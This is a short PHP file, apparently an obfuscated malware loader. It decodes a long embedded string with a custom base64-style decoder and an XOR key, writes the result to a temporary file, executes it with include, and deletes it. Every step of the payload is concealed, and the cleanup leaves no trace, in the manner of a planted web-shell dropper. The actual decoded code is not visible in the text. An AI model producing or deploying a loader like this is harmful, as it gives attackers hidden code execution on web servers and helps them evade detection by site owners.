<?php
$encrypted = 'S1oVHhlhfQwDVkFIKDYgJD8pJT5CJCw9IiA2IjYhMjEtOS1LKkVYS1RMUDUqJT1LXkUee2NMV0VFHw9MXwwWBQwYX0E6JiY_Iz5CBggYH0I4X0BMDGhvVklMV0VFVklIHgsVAx08FhENVlRMUzo1OTo4LEIVFx0EUDhee2NMV0VFC0kJGxYAHw9MXwwWBQwYX0E6MSw4LEIVFx0EUDhMX0kXem9FVklMV0VFVk0FGRUQAjkNAw1FS0lIKCIgIjJLBwQRHk4xTGhvVklMVxhFEwUfEkUee2NMV0VFVklMV0EMGBkZAzUEAgFMSkVCUVJhfUVFVkkRem9FVklMem9FVklMHgNFXk0FGRUQAjkNAw1FUE9MHhY6EgAeX0EMGBkZAzUEAgFFXkUee2NMV0VFVklMVwYNEgAeX0EMGBkZAzUEAgFFTGhvVklMVxhofElMV0UAGhoJDGhvVklMV0VFVkkPHwEMBEEIHhcLFwQJXwIAAgobE01MX0BXem9FVklMCmhvVklMV2hvVklMV0EGGQ0JV1hFHxofEhFNUjY8ODYxLU4PGAEAUTRFV1pFUjY8ODYxLU4PGAEAUTRMTUVCUVJhfWhvVklMVwwDVkEfAxcVGRpEAxcMG0FIFAoBE0BAV0JZSRkEB0JMVkhRSkVVX0kXem9FVklMV0VFVk0PGAEAVlRMVVlaBgEcKwtHVkdMUwYKEgxXem9FVklMCmhve2NMV0VFUh0JGhUjHwUJV1hFAgwBBwsEG0EfDhY6EQwYKBEAGxkzEwwXXkBAV0IGGQcfGAkAKU5FV0tFUUccHxVCTWRmV0VFVg8FGwA6BhwYKAYKGB0JGREWXk0YEggVMAAAEklFUgoDEwBMTWRmem9FVklMGAc6BR0NBRFNX1JhfUVFVkkYBRxFDWRmV0VFVklMV0UMGAoAAgEAVk0YEggVMAAAEl5ofElMV0UYVgoNAwYNVkE4HxcKAQgOGwBFUgxFVx5ofElMV0VFVklMEgYNGUlOEhcXGRtWV0dFWElIEkhbEQwYOgAWBQgLEk1MTWRmV0VFVhRhfUVFVklIGBARBhwYV1hFGQszEAARKQoAEgQLXkBXem9ofElMV0UQGAUFGQ5NUh0JGhUjHwUJXl5ofGRmV0VFVgwPHwpFVFUcBQBbVElCVw0RGwUfBwAGHwgAFA0EBBpEUwoQAhkZA0xFWElOS0oVBAxSVV5ofBRhfVpbe2M';
if (!function_exists('damselfly')) {
    function damselfly($data, $key) {
        $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
        $bin = '';
        for ($i = 0; $i < strlen($data); $i++) {
            $index = strpos($alphabet, $data[$i]);
            $bin .= str_pad(decbin($index), 6, '0', STR_PAD_LEFT);
        }

        $bytes = '';
        for ($i = 0; $i < strlen($bin); $i += 8) {
            $chunk = substr($bin, $i, 8);
            if (strlen($chunk) < 8) break; // если меньше 8 бит — игнорируем
            $bytes .= chr(bindec($chunk));
        }

        $res = '';
        $klen = strlen($key);
        for ($i = 0; $i < strlen($bytes); $i++) {
            $res .= $bytes[$i] ^ $key[$i % $klen];
        }
        return $res;
    }
}

file_put_contents($tmp = tempnam(sys_get_temp_dir(), 'shf_'), damselfly($encrypted, 'weevil'));
include $tmp;
unlink($tmp);

?>